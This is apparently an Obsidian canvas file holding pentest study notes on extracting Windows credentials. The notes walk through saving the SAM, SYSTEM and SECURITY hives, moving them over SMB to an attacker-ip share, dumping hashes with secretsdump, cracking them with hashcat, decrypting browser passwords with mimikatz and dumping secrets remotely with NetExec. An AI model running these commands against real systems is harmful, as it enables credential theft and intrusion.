		{"id":"5026d061b36ff403","type":"text","text":"#  Attacking SAM, SYSTEM, and SECURITY\n\n## Registry Hive Overview\n\n|Hive|Purpose|\n|---|---|\n|HKLM\\SAM|Stores password hashes for local user accounts|\n|HKLM\\SYSTEM|Holds the system boot key (needed to decrypt SAM hashes)|\n|HKLM\\SECURITY|LSA secrets, cached domain credentials, DPAPI keys, etc.|\n\n---\n\n## Saving Registry Hives with reg.exe\n\nRun as admin; backs up registry hives so you can extract hashes offline.\n\n\n`reg.exe save hklm\\sam C:\\sam.save reg.exe save hklm\\system C:\\system.save reg.exe save hklm\\security C:\\security.save`\n\n- `save` copies hive data to file, allowing later transfer and analysis.\n    \n- HKLM\\SAM + HKLM\\SYSTEM are needed to dump and decrypt local user hashes.\n    \n- HKLM\\SECURITY is useful for domain or advanced credential extraction.\n    \n\n---\n\n## Transferring Hive Files with Impacket smbserver\n\nCreates an SMB share for easy movement of files from target to attacker.\n\n\n`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/`\n\n- `-smb2support` ensures compatibility with newer Windows hosts (SMBv1 is disabled).\n    \n- CompData names the share; `/home/...` sets destination dir.\n    \n\nOn target Windows host, move files to the SMB share:\n\n\n`move sam.save \\\\<attacker-ip>\\CompData move system.save \\\\<attacker-ip>\\CompData move security.save \\\\<attacker-ip>\\CompData`\n\n- Each file is sent over SMB to the attack host’s shared folder.\n    \n\nOn attack host, confirm:\n\n`ls`\n\n- Should see the .save hive backups listed.\n    \n\n**Warning:** SMBv1 is insecure and vulnerable to public RCE exploits; always use SMBv2+.\n\n---\n\n## Dumping Hashes with secretsdump.py\n\nExtracts password and credential data from hive files.\n\n\n`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`\n\n- `-sam`, `-security`, `-system` flags tell secretsdump which files to process.\n    \n- Output includes SAM (user hashes), cached domain hashes, LSA secrets, DPAPI machine/user keys.\n    \n- NT hashes (modern Windows) and LM hashes (older, weaker) are dumped for each local account.\n    \n\n---\n\n## Hashcat Usage - Cracking NTLM Hashes\n\nPreparing NT hashes for cracking:\n\nthe secretsdump output is structured like so:\n```shell-session\nDumping local SAM hashes (uid:rid:lmhash:nthash)\n```\n\n`sudo nano hashestocrack.txt`\n\nPopulate text file with NT hashes, one per line:\n\n```shell-session\n64f12cddaa88057e06a81b54e73b949b\n31d6cfe0d16ae931b73c59d7e0c089c0\n6f8c3f4d3869a10f3b4f0522f537fd33\n184ecdda8cf1dd238d438c4aea4d560d\nf7eb9c06fafaa23c4bcf22ba6781c1e2\n```\n\nCrack hashes with Hashcat:\n\n`sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt`\n\n- `-m 1000` selects NTLM hash mode.\n    \n- `/usr/share/wordlists/rockyou.txt` is the wordlist for dictionary attack.\n    \n\nHashcat outputs cracked passwords; associate results with usernames for later lateral movement. If no output, try alternative wordlists, rules, or brute force modes.\n\n---\n\n## Cracking DCC2 Hashes (Domain Cached Credential 2)\n\nDCC2 hashes are much slower to crack (PBKDF2). Use mode 2100.\n\ntext\n\n`hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt`\n\n- Cracking speed is much reduced; strong passwords are often infeasible within pentest windows.\n    \n\n---\n\n## DPAPI Extraction and Decryption\n\nDPAPI is used by Windows for encrypting critical secrets (browser passwords, saved credentials, etc.).  \nCan be dumped (machine/user keys) with secretsdump and decrypted using mimikatz or impacket's dpapi.py.\n\nExample (using mimikatz):\n\ntext\n\n`mimikatz # dpapi::chrome /in:\"C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect`\n\n- Recovers locally saved browser passwords, using extracted DPAPI keys.\n    \n\n---\n\n## Dumping Hashes & Secrets Remotely (NetExec)\n\nWith SMB access and admin creds, can extract SAM and LSA secrets remotely.\n\ntext\n\n`netexec smb <target-ip> --local-auth -u <user> -p <password> --lsa`\n\n- Dumps LSA secrets, including service passwords, DPAPI keys, and domain cache (NL$KM).\n    \n    netexec smb <target-ip> --local-auth -u <user> -p <password> --sam\n    \n- Dumps SAM database (user password hashes) for offline cracking.\n    \n\n---\n\n## Comparison Table: Techniques & Tools\n\n|Goal|Command/Tool|Flags/Params|Output Type|\n|---|---|---|---|\n|Hive backup|reg.exe|save hklm* filename|.save files|\n|Move files (Win->Lin)|move|src dest|Shared folder transfer|\n|Run SMB server|smbserver.py (impacket)|-smb2support share dir|Attacker SMB share|\n|Extract hashes/local|secretsdump.py (impacket)|-sam/-system/-security file LOCAL|SAM, LSA, DPAPI, hashes|\n|Crack hashes|hashcat|-m 1000/-m 2100 hashlist wordlist|Plaintext passwords|\n|Dump remotely|netexec smb|--sam/--lsa creds|Hashes, secrets|\n|DPAPI decrypt|mimikatz/dpapi.py|dpapi::chrome /in: file|Browser creds, tokens|\n\n---\n\n## Summary of Attack Process\n\n- Backup SAM/SYSTEM/SECURITY hives with reg.exe (require admin rights).\n    \n- Transfer hives to attacker via SMB share (prefer SMB2+, avoid SMBv1 for security).\n    \n- Use secretsdump to extract NTLM/LM hashes and LSA secrets.\n    \n- Crack NT hashes with Hashcat (-m 1000); crack DCC2 with Hashcat (-m 2100; expect slower results).\n    \n- Use DPAPI machine/user keys to decrypt browser and credential manager secrets with mimikatz or dpapi.py.\n    \n- NetExec enables remote dumping of hashes/secrets if admin rights are available via SMB.\n    \n\nThese steps facilitate efficient extraction and offline cracking of password material. Cracked passwords often enable lateral movement, privilege escalation, or persistence on Windows enterprise networks. Detection is possible if admins monitor registry/file operations, SMB access, or hash extraction. Use advanced passwords and restrict admin permissions for mitigation.","x":-440,"y":-657,"width":1220,"height":4977}
	],
	"edges":[]
}